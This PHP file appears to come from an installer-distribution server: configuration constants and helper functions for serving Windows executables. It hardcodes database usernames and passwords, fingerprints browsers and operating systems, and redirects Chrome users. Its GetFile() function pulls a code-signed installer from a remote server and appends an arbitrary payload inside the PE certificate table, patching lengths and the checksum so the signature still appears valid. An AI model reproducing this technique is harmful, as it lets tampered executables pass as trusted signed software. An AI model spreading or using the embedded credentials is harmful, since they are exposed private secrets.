<?php

//==================================================  Initial parameters setting part ====================================

// connection for main database (main database is in installmetrix.com domain)   
// !NOTE : it is fixed information for other domains except installmetrix.com
define('MAINSQLHOST', 'localhost');
define('MAINSQLUSER', 'ints9a3h_dbman');
define('MAINSQLPASS', 'dxDcX$R2]^Ir');
define('MAINSQLDB', 'ints9a3h_new');

// connection for local database of this domain
define('SQLHOST_LOCAL', 'localhost');
define('SQLUSER_LOCAL', 'tota89hg_root');
define('SQLPASS_LOCAL', 'f=ew[s4Ddvnn');
define('SQLDB_LOCAL', 'tota89hg_main');

// domain information, it is using for codesign
define('DOMAIN_NAME', 'totalnethits.biz');
define('DOMAIN_IP', '8.36.40.203');

// windows server information, it is using for codesign
define('WINDOW_SERVER_SIGNURL', 'http://8.29.154.20:8080/index.html?');
define('WINDOWS_SERVER_EXEURL', 'http://8.29.154.20/installers/');

// redirect information, it is using when user use chrome, !NOTE : it is url, so please put http:// or https://
//define('REDIRECT_URL', 'https://securehost-2.com');
define('REDIRECT_URL', 'http://totalnethits.biz');
define('REDIRECTING_OPTION', 'YES'); //when user use chrome and if this value is "YES" , then user will be redirected, but this value is "NO", then redirecting will not work
define('DOMAIN_URL', 'http://totalnethits.biz'); 
 

//================================================== Programming parameters setting part ========================================

define('DEFAULT_IP', '206.225.132.11');


//===============================================================================================================================

function RandomString($length)
{
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $len = strlen($characters);
    $randstring = "";
    for ($i = 0; $i < $length; $i++) {
        $randstring .= $characters[rand(0, $len-1)];
    }
    return $randstring;     
}

function RandomeStringName($length)
{
    $first_characters = "abcdefghijklmnopqrstuvwxyz";
    $len = strlen($first_characters);
    
    $other_characters = "abcdefghijklmnopqrstuvwxyz1234567890";
    $len_1 = strlen($other_characters); 
    
    $randstring = "";
    
    $randstring .= $first_characters[rand(0, $len-1)];
    
    for ($i = 0; $i < $length-1; $i++) {
        $randstring .= $other_characters[rand(0, $len_1-1)];
    }
    return $randstring;  
}

function RandomeUpperStringValue($length)
{
    $characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $len = strlen($characters);   
     
    $randstring = "";
    for ($i = 0; $i < $length; $i++) {
        $randstring .= $characters[rand(0, $len-1)];
    }
    return $randstring;  
}     

function Convert_IPString_To_Int($strIP)
{
    $ipArray = explode('.', $strIP);
    $nIP = $ipArray[0]*256*256*256 + $ipArray[1]*256*256 + $ipArray[2]*256 + $ipArray[3];
    return $nIP;
}

function user_browser($agent) {
    preg_match("/(MSIE|Opera|Firefox|Chrome|Version|Opera Mini|Netscape|Konqueror|SeaMonkey|Camino|Minefield|Iceweasel|K-Meleon|Maxthon)(?:\/| )([0-9.]+)/", $agent, $browser_info);
    list(, $browser, $version) = $browser_info;
    if (preg_match("/Opera ([0-9.]+)/i", $agent, $opera))
        return 'Opera|' . $opera[1];
    if ($browser == 'MSIE') {
        preg_match("/(Maxthon|Avant Browser|MyIE2)/i", $agent, $ie);
        if ($ie)
            return $ie[1] . ' based on IE|' . $version;
        return 'IE|' . $version;
    }
    if ($browser == 'Firefox') {
        preg_match("/(Flock|Navigator|Epiphany)\/([0-9.]+)/", $agent, $ff);
        if ($ff)
            return $ff[1] . '|' . $ff[2];
    }
    if ($browser == 'Opera' && $version == '9.80')
        return 'Opera|' . substr($agent, -5);
    if ($browser == 'Version')
        return 'Safari|' . $version;
    if (!$browser && strpos($agent, 'Gecko'))
        return 'Browser based on Gecko';
    return $browser . '|' . $version;
}

function user_os($userAgent) {
    $oses = array(
        'iPhone' => '(iPhone)',
        'Windows 3.11' => 'Win16',
        'Windows 95' => '(Windows 95)|(Win95)|(Windows_95)',
        'Windows 98' => '(Windows 98)|(Win98)',
        'Windows 2000' => '(Windows NT 5.0)|(Windows 2000)',
        'Windows XP' => '(Windows NT 5.1)|(Windows XP)',
        'Windows 2003' => '(Windows NT 5.2)',
        'Windows Vista' => '(Windows NT 6.0)|(Windows Vista)',
        'Windows 7' => '(Windows NT 6.1)|(Windows 7)',
        'Windows NT 4.0' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        'Windows ME' => 'Windows ME',
        'Open BSD' => 'OpenBSD',
        'Sun OS' => 'SunOS',
        'Linux' => '(Linux)|(X11)',
        'Safari' => '(Safari)',
        'Mac OS' => '(Mac_PowerPC)|(Macintosh)',
        'QNX' => 'QNX',
        'BeOS' => 'BeOS',
        'OS/2' => 'OS/2',
        'Search Bot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp/cat)|(msnbot)|(ia_archiver)'
    );
    foreach ($oses as $os => $pattern) {
        if (eregi($pattern, $userAgent)) {
            return $os;
        }
    }
    return 'Unknown';
}

function download_file ($url, $path) {

    $newfilename = $path;
    $file = fopen ($url, "rb");
    if ($file) 
    {
        $newfile = fopen ($newfilename, "wb");

        if ($newfile)
            while(!feof($file)) 
            {
                fwrite($newfile, fread($file, 1024 * 8 ), 1024 * 8 );
            }
    }

    if ($file) {
        fclose($file);
    }
    if ($newfile) {
        fclose($newfile);
    }
}


function GetFile($FileName, $displayed_name, $PayloadStr) {
    //if(strlen($PayloadStr)!=16) return FALSE;

    //check filename is existing on this server or not.
    $check = file_exists($FileName);
    if($check == FALSE)    
    {
        $path = curPathURL();
        //make new codesigned installer and get it from windows server
        //make new isntaller to windows server
        $name = str_ireplace('.exe', '', $displayed_name);
        $url = WINDOW_SERVER_SIGNURL . "name=" . $name . "&domain=" . DOMAIN_NAME;
        $res = file_get_contents($url);          
        
        //copy the installer from windows server to this domain 
        $full = WINDOWS_SERVER_EXEURL . $name . ".exe";
        $newfile = $_SERVER['DOCUMENT_ROOT'] . '/installers/' . $name . ".exe";
        download_file($full, $newfile);        
    } 
    $handle=fopen($FileName,'rb');
    if (!$handle) return FALSE;

    $Header=fread ($handle,64);
    if (substr($Header,0,2)!='MZ') return FALSE;
    $PEOffset=unpack("V",substr($Header,60,4));
    if ($PEOffset[1]<64) return FALSE;
    fseek($handle,$PEOffset[1],SEEK_SET);
    $Header=fread ($handle,24);
    if (substr($Header,0,2)!='PE') return FALSE;

    //$Machine=unpack("v",substr($Header,4,2));
    //if ($Machine[1]!=332) return FALSE; //32 bit or return just precaution
    //$NoSections=unpack("v",substr($Header,6,2));
    
    $tmp = unpack("v",substr($Header,20,2));
    $OptHdrSize=array_shift($tmp);

    //$PAYLOAD_ALIGNMENT = 512; //FileAlignment in optional PE header
    $opt_header_pos=  ftell($handle);
    $opt_header=fread($handle,$OptHdrSize);

    //$size_of_image= array_shift(unpack("V",substr($opt_header,56,4)));
    $tmp = unpack("V",substr($opt_header,36,4));
    $PAYLOAD_ALIGNMENT = array_shift($tmp);
    $CERTIFICATE_ENTRY_OFFSET = 148;

    if($PAYLOAD_ALIGNMENT!=512) return FALSE; //Strange file alignment
    $cert_table_offset = 0;
    $cert_table_length = 0;

    fseek($handle,$PEOffset[1]+4+$CERTIFICATE_ENTRY_OFFSET,SEEK_SET);
    $tmp=fread ($handle,4);
    $tmp1 = unpack("V", $tmp);
    $cert_table_offset=array_shift($tmp1);
    $cert_table_length_offset=ftell($handle);

    $tmp=fread ($handle,4);
    $tmp1 = unpack("V", $tmp);
    $cert_table_length=array_shift($tmp1);

    fseek($handle,$cert_table_offset,SEEK_SET);

    $cert_table_length2 = 0;
    $tmp=fread ($handle,4);
    $tmp2 = unpack("V", $tmp);
    
    $cert_table_length2 = array_shift($tmp2);
    

    //var_dump($cert_table_length);
    //var_dump($cert_table_length2);exit;       

    if($cert_table_length!=$cert_table_length2) return FALSE; //Failed to read certificate table location properly

    fseek($handle,0,SEEK_END);
    if ($cert_table_offset + $cert_table_length !=ftell($handle)) return FALSE; //The certificate table is not located at the end of the file!

    fseek($handle,0,SEEK_SET);
    $buffer=fread ($handle,filesize($FileName));

    $payload_size = strlen($PayloadStr);
    $padding_size = $PAYLOAD_ALIGNMENT - ($payload_size % $PAYLOAD_ALIGNMENT);

    $cert_table_length += $payload_size + $padding_size;

    $buffer=$buffer . str_repeat("\x0", $padding_size) . $PayloadStr;
    $cert_table_length_packed=pack("V", $cert_table_length+0);
    //$cert_table_length_packed2=array_shift(unpack("V", $cert_table_length_packed));
    $buffer=substr_replace ($buffer, $cert_table_length_packed,$cert_table_length_offset,4);
    $buffer=substr_replace ($buffer, $cert_table_length_packed,$cert_table_offset,4);
    fclose($handle);
    $PEchecksum=pack("V","\0\0\0\0");
    $buffer=substr_replace ($buffer, $PEchecksum,$opt_header_pos+64,4);

    //ob_start();
    
    header('Content-Type: application/octet-stream');
    header("Content-Transfer-Encoding: Binary"); 
    header("Content-disposition: attachment; filename=\"" . $displayed_name . "\""); 

    echo $buffer;

    //ob_flush();
}

function curPathURL() 
{
    $pageURL = 'http';
     if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
     $pageURL .= "://";
     if ($_SERVER["SERVER_PORT"] != "80") {
      $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"];
     } else {
      $pageURL .= $_SERVER["SERVER_NAME"];
     }
     return $pageURL;
}

?>
